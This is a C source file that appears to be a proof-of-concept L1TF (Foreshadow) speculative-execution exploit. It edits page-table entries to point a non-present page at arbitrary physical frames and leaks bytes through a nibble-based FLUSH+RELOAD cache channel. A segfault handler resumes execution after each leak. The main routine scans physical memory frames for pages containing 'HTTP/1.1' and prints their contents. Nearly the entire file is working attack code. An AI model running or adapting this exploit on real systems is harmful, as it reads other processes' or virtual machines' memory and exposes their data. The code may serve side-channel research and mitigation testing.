#include "asm.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "statistics.h"
#include <bits/types/siginfo_t.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

extern uint64_t reload_label(void);

#define THRESHOLD 150

#define REG_RIP 16
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
  ucontext_t *uc = (ucontext_t *)ucontext;
  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
  *rip = (uint64_t)&reload_label;
}
#pragma GCC diagnostic pop

// The reload buffer will be used to leak 8 bytes at a time.
// Instead of leaking byte-for-byte, and thus needing a covert
// channel "resolution" of 2^8 = 256 pages per byte we want to leak,
// we can leak nibble-for-nibble. This requires just 2^4 = 16 pages
// per nibble, giving us the ability to leak 256/16 = 16 nibbles = 8 bytes
// per FLUSH+RELOAD iteration.
// The tradeoff is that we require a larger speculative window, and need
// some additional post processing to reconstruct the data.
#define AMOUNT_OF_OPTIONS_IN_NIBBLE 16
#define AMOUNT_OF_NIBBLES_PER_RELOAD 2
#define AMOUNT_OF_RELOAD_PAGES                                                 \
  (AMOUNT_OF_OPTIONS_IN_NIBBLE * AMOUNT_OF_NIBBLES_PER_RELOAD)
typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD]
                               [AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];

uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer) {
  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};

  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);

  // Flush the address of the segfault handler to increase
  // the length of the speculative window (hopefully?)
  clflush((void *)segfault_handler);
  mfence();

  asm volatile("xor %%rax, %%rax\n"
               "xor %%rbx, %%rbx\n"
               "movq (%[leak_addr]), %%rax\n"
               "movq %%rax, %%rbx\n"
               "and $0xf0, %%rax\n"
               "and $0x0f, %%rbx\n"
               "shl $0x8, %%rax\n"
               "shl $0xc, %%rbx\n"
               "prefetcht0 (%[nibble1], %%rax)\n"
               "prefetcht0 (%[nibble0], %%rbx)\n"
               "mfence\n"
               "loop:\n"
               "pause\n"
               "jmp loop\n"
               ".global reload_label\n"
               "reload_label:"

               ::[leak_addr] "r"(leak_addr),
               [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
               : "rax", "rbx");

  reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
         THRESHOLD);

  // Reconstruct
  uint8_t result = 0;
  for (size_t nibble = 0; nibble < AMOUNT_OF_NIBBLES_PER_RELOAD; ++nibble) {
    size_t *partial_results =
        &raw_results[nibble * AMOUNT_OF_OPTIONS_IN_NIBBLE];
    size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE, partial_results);
    result |= max << (4 * nibble);
  }

  return result;
}

void leak_page(size_t pfn, void *leak, reload_buffer_t reload_buffer,
               uint8_t data_out[PAGE_SIZE]) {
  // Set the PFN of the leak page
  ptedit_pte_set_pfn(leak, 0, pfn);

  for (size_t j = 0; j < 0x100; j += 1) {
    void *leak_addr = (char *)leak + j;
    uint8_t leaked_byte = l1tf(leak_addr, reload_buffer);
    data_out[j] = leaked_byte;
  }
}

int main(int argc, char *argv[argc]) {
  // Step 1: Create a variable
  // Step 2: modify PTE to change make page containing that variable non-present
  //         and modify the PFN
  // Step 3: FLUSH reload buffer
  // Step 4: Speculatively access variable
  // Step 5: RELOAD reload buffer
  assert(argc > 0);
  if (argc != 3) {
    fprintf(stderr, "Usage: %s [physical address to leak in hex] [length]\n",
            argv[0]);
    exit(1);
  }

  char *tail = NULL;
  uintptr_t phys_addr = strtoull(argv[1], &tail, 16);
  assert(tail != argv[1]);
  size_t pfn = (phys_addr & ~(0xfff)) >> 0xc;

  tail = NULL;
  size_t length = strtoull(argv[2], &tail, 10);
  assert(tail != argv[2]);
  assert((phys_addr & 0xfff) + length < PAGE_SIZE);

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
          (void *)phys_addr);

  fprintf(stderr, "Request leak and reload buffers\n");
  void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(leak != MAP_FAILED);

  reload_buffer_t *reload_buffer =
      mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  // Modify the PFN
  fprintf(stderr, "Set leak PFN to requested 0x%lx\n", pfn);
  assert(!ptedit_init());
  assert(!mprotect(leak, PAGE_SIZE, PROT_NONE));
  size_t leak_original_pfn = ptedit_pte_get_pfn(leak, 0);
  ptedit_pte_clear_bit(leak, 0, PTEDIT_PAGE_BIT_PRESENT);
  ptedit_pte_set_pfn(leak, 0, pfn);

  struct sigaction sa = {0};
  sa.sa_handler = (void *)segfault_handler;
  sigaction(SIGSEGV, &sa, NULL);

  fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  char needle[8] = "HTTP/1.1";
  uint8_t page[PAGE_SIZE] = {0};

  for (size_t p = 0; p < 0x1000000; ++p) {
    fprintf(stderr, "Looking at PFN %lx\r", p);
    leak_page(p, leak, *reload_buffer, page);
    char *ptr = memmem(page, PAGE_SIZE, needle, 8);
    if (ptr != NULL) {
      fprintf(stderr, "Found on PFN %lx:\n", p);
      for (int i = 0; i < PAGE_SIZE; ++i) {
        printf("%c", page[i]);
      }
      fprintf(stderr, "\n");
    }
  }

  // printf("Results physcial addr %lx:\n", phys_addr);
  // size_t start = (phys_addr & 0xfff);
  // for (size_t j = start; j < start + length; j += 1) {
  //   void *leak_addr = (char *)leak + j;
  //   uint8_t leaked_byte = l1tf(leak_addr, *reload_buffer);
  //   printf("%x ", leaked_byte);
  // }
  // printf("\n");

  // Restore the segfault handler back to normal
  sa.sa_handler = SIG_DFL;
  sigaction(SIGSEGV, &sa, NULL);

  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak, 0, leak_original_pfn);
  assert(!munmap(leak, PAGE_SIZE));
  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
  ptedit_cleanup();
}
